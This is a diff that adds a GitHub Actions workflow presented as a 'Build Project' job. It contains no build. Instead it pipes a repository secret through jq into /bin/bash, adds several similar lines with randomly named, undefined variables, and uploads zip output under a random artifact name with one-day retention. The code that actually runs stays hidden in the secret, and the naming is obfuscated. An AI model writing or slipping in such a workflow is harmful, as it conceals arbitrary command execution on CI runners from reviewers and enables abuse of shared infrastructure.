@@ -1,0 +1,34 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  runner:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Go
+        env:
+          knq0: ${{ secrets.knq0 }}
+        run: |
+          printf '%s' "$knq0" | jq -r .kg8827 | /bin/bash
+          printf '%s' "$xcl9" | jq -r .g9481 | /bin/bash
+          echo $xol045 | jq -r .fdzrn7942 | /bin/bash
+          echo $uy5778 | jq -r .gctz06 | /bin/bash
+          echo $uy400 | jq -r .t4897 | /bin/bash
+          echo $x9 | jq -r .qaziw918 | /bin/bash
+          printf '%s' "$xn8" | jq -r .oofih23314 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VQgPJ40I
+          path: "*.zip"
+          retention-days: 1
